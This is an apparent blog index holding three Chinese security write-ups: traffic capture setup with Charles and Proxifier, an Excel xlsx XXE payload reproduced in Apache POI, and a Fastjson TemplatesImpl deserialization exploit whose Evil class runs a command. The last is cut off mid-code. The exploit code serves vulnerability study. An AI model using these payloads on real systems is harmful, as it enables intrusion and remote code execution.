[{"title":"Charles给小程序抓包","url":"/2022/09/16/Charles%E7%BB%99%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/","content":"<h1 id=\"Charles给小程序抓包\"><a href=\"#Charles给小程序抓包\" class=\"headerlink\" title=\"Charles给小程序抓包\"></a>Charles给小程序抓包</h1><h2 id=\"一、安装Charles\"><a href=\"#一、安装Charles\" class=\"headerlink\" title=\"一、安装Charles\"></a>一、安装Charles</h2><p>1.安装证书</p>\n<p><img src=\"pG0XoC9MAsAcFgjLaPCGtxmjRYSumjC66wajCa-MA0c.png\" alt=\"image\"></p>\n<p><img src=\"3vrOpGZfAJC9lEWinoeCeTW9XY_gCHfgyxtidLx2CcY.png\" alt=\"image\"></p>\n<p><img src=\"ic0fMqTG_FaV8bh7MiraFTy1GRlNY2wXYnSDKuDRC10.png\" alt=\"image\"></p>\n<p><img src=\"HfMPoQHzBaRKmzJCDymIZWXxjHSNYPpRb05EtXE-oZQ.png\" alt=\"image\"></p>\n<p><img src=\"NSQXtmABHU2aPteRXdZBInKs2T-kKA1ojVE5k4Sn5jo.png\" alt=\"image\"></p>\n<p><img src=\"e3Z7LvW3Qr6j3VOVA8MsObSzdN-P7ELokKENBVKzacI.png\" alt=\"image\"></p>\n<p>设置SSL和开启SSL</p>\n<p><img src=\"L3bmZHLDAjZJjYHGWXBXB3vuozNJldC-HCqX370yhY8.png\" alt=\"image\"></p>\n<p><img src=\"YzLESr7yJkCnbQkjBSOamFkl0nhxCu0acS61yb1uzbw.png\" alt=\"image\"></p>\n<p>设置监听的端口</p>\n<p><img src=\"NicAqY665h3xuhY2pndYy3p3uysksVRUYqcIbavQTo0.png\" alt=\"image\"></p>\n<p><img src=\"1vLCaHgibVtdIJKdPoKvW-9j9lHKxqOadtv3RVMDnas.png\" alt=\"image\"></p>\n<h2 id=\"二、安装Proxifer\"><a href=\"#二、安装Proxifer\" class=\"headerlink\" title=\"二、安装Proxifer\"></a>二、安装Proxifer</h2><p>思路：</p>\n<p>让小程序流量走Charles–&gt;让Charles走burp  其它的放行</p>\n<p><img src=\"b3IN9unshvh5wYczl5Vjm3sZfXFiF3PQpLPFJIJTGeo.png\" alt=\"image\"></p>\n<p><img src=\"tBp7d1hsWSHZJhvOGGPtCY_Aw50qxm4rgxXJ7-Q4pXY.png\" alt=\"image\"></p>\n<p><img src=\"MmY3TjFbAJ9DCGj3oy410LsnHyQzQFPhc_5Zo_7-Ir4.png\" alt=\"image\"></p>\n<p>一号箭头处要设置为direct，不然抓的包很乱</p>\n<h2 id=\"三、注意\"><a href=\"#三、注意\" class=\"headerlink\" title=\"三、注意\"></a>三、注意</h2><p>1.如果没有流量的话，可以尝试重启电脑</p>\n<p>2.所有的程序使用管理员运行</p>\n<p>3.可以先在Charles中观察一下流量，确认没问题后再转发给burp</p>\n<p><img src=\"mVbHzSvFC2K6awz9FVxQMeKIpPIgqJYbWJsp-JMJ1og.png\" alt=\"image\"></p>\n","categories":["工具使用"],"tags":["工具使用","抓包","小程序"]},{"title":"Excel的XXE攻击","url":"/2022/12/30/Excel%E7%9A%84XXE%E6%94%BB%E5%87%BB/","content":"<h1 id=\"Excel的XXE攻击\"><a href=\"#Excel的XXE攻击\" class=\"headerlink\" title=\"Excel的XXE攻击\"></a>Excel的XXE攻击</h1><h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Microsoft Office从2007版本引入了新的开放的XML文件格式，基于压缩的ZIP文件格式规范，改后缀名为zip再解压缩可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。</p>\n<p>xls与xlsx格式不同，xls是特有的二进制格式，其核心结构是复合文档类型，而xlsx的核心结构是XML类型，采用基于XML的压缩方式。xls格式文件无法插入payload进行XXE攻击<br>测试的时候，根据功能点，docx，xlsx都可以尝试。</p>\n<h2 id=\"二、制作恶意的xlsx\"><a href=\"#二、制作恶意的xlsx\" class=\"headerlink\" title=\"二、制作恶意的xlsx\"></a>二、制作恶意的xlsx</h2><p>制作xlsx：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">unzip payload.xlsx</span><br><span class=\"line\">zip -r payload.xslx *</span><br></pre></td></tr></table></figure>\n<p>添加xxe的payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM <span class=\"string\">&quot;http://127.0.0.1:7788/xxe&quot;</span>&gt; ]&gt;</span><br><span class=\"line\">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"gtiUbvWNbXK-tZ3T1KTU_idl9EfeYQCOkNLA6GyBK-8.png\" alt=\"image\"></p>\n<h2 id=\"三、idea复现\"><a href=\"#三、idea复现\" class=\"headerlink\" title=\"三、idea复现\"></a>三、idea复现</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.ss.usermodel.Cell;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.ss.usermodel.Row;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.xssf.usermodel.XSSFSheet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.xssf.usermodel.XSSFWorkbook;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">poc</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">excelFile</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;/Users/garck/D/java-code/javaStudy/excel_xxe/2/payload2.xlsx&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(excelFile);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">XSSFWorkbook</span> <span class=\"variable\">workbook</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">XSSFWorkbook</span>(in);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">XSSFSheet</span> <span class=\"variable\">sheet</span> <span class=\"operator\">=</span> workbook.getSheetAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">total</span> <span class=\"operator\">=</span> sheet.getLastRowNum();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Row row : sheet)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Cell cell : row)&#123;</span><br><span class=\"line\">                System.out.println(cell.getStringCellValue()+<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.example<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>excel_xxe<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.0-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.source</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.source</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.target</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.target</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.poi<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>poi-ooxml<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.9<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.poi<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>ooxml-schemas<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>复现截图：</p>\n<p><img src=\"A_eSYE5PnUs_d1FttT-9Lgaalp3qMBjgZnBiU5D-aNk.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","XXE"]},{"title":"Fasjson漏洞不出网（本地序列化）","url":"/2022/06/15/Fasjson%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%BD%91%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/","content":"<h1 id=\"Fasjson漏洞不出网（本地序列化）\"><a href=\"#Fasjson漏洞不出网（本地序列化）\" class=\"headerlink\" title=\"Fasjson漏洞不出网（本地序列化）\"></a>Fasjson漏洞不出网（本地序列化）</h1><h1 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h1><p>fastjson getshell的时候 需要构造一个恶意类 </p>\n<p>用的 rmi和jdni协议都是要出网的。在内网的情况下如果不出网的情况下就难以利用。</p>\n<h1 id=\"TemplatesImpl\"><a href=\"#TemplatesImpl\" class=\"headerlink\" title=\"TemplatesImpl\"></a>TemplatesImpl</h1><p>这个利用链有限制的。由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24</p>\n<p>使用条件 </p>\n<p>1. parseObject(input,Object.class,Feature.SupportNonPublicField)</p>\n<p>2. parse(input,Feature.SupportNonPublicField)</p>\n<p>这里解释一下payload的构造：</p>\n<p>@type：当fastjson根据json数据对TemplatesImpl类进行反序列化时，会调用TemplatesImpl类的getOutputProperties方法触发利用链加载_bytecodes属性中的TempletaPoc类字节码并实例化，执行RCE代码。</p>\n<p>_bytecodes：主要是恶意类TempletaPoc的字节码。</p>\n<p>_name：关于_name属性，在调用TemplatesImpl利用链的过程中，会对_name进行不为null的校验，因此_name的值不能为null（具体可参考CC2利用链）</p>\n<p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类</p>\n<p>outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>创建一个项目</p>\n<p><img src=\"qWyFAFmUw-9zSl7rpetkjDC181oBNuYPTb_yClT8Vu4.png\" alt=\"image\"></p>\n<p>新建立一个类App.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setId</span><span class=\"params\">(String ids)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;setId go&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.id=ids;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getId</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;GetId go&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>添加依赖</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.22</span>&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n<p>完整的pom.xml</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastJsonSecNoNetwork&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.22</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<p>运行</p>\n<p><img src=\"rRsGgenSvYZ8OgD4npe84sYzv1r8YtcNX01JqtZ1pa0.png\" alt=\"image\"></p>\n<p>把方法删掉无法获取值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>User go</p>\n<p>User{id&#x3D;’null’}</p>\n<p><img src=\"nFqqPi1xJYiAfKaVKUXsVlCcxuk0UMkgJTjxoVSc7d4.png\" alt=\"image\"></p>\n<p>私有变量 加上 Feature.SupportNonPublicField 是可以进行赋值的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>,Feature.SupportNonPublicField));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>User go</p>\n<p>User{id&#x3D;’110’}</p>\n<p><img src=\"ALTw5wB5dlE5LG3DQ1f58584uDs9X7-z4wu3GJ7lBp0.png\" alt=\"image\"></p>\n<p>是的，就是7U21链里面的TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>\n<p>这个类本身就存在反序列化漏洞，会将成员变量_bytecodes的数据作为类的字节码进行newInsantce操作从而调用其构造方法或static块。故可以fastjson为契机去调用此类。</p>\n<p>但是由于_name 和_bytecodes 是私有属性，所以需要FASTJSON反序列化接口有Feature.SupportNonPublicField参数才能实现，利用条件很苛刻，但是条件允许的话就很方便，payload打过去就完事。</p>\n<p>“_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。”</p>\n<p>创建Evil类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Evil</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractTranslet</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            String[] cmd = &#123;<span class=\"string\">&quot;calc&quot;</span>&#125;;</span><br><span class=\"line\">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> ( Exception e ) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>javac Evil.java编译该类</p>\n<p><img src=\"9TvpZnV2NudwpWE3O1tq4A8I7xfqyVFwPuGRsg-a7-g.png\" alt=\"image\"></p>\n<p>得到class</p>\n<p><img src=\"D14cKaQFIC1UrEbeZM-Cy5aGpQYTq0yzXoBvESQkHpM.png\" alt=\"image\"></p>\n<p>构造恶意类 编译 读取文件得到payload</p>\n<p>创建一个FastjsonTemplatesImpl类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FastjsonTemplatesImpl</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;E:\\\\code\\\\java_code\\\\vulnerability_Recurrence\\\\fastJsonSecNoNetwork\\\\src\\\\main\\\\java\\\\garck\\\\Evil.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">byteCode</span>  <span class=\"operator\">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">NASTY_CLASS</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class=\"line\">                <span 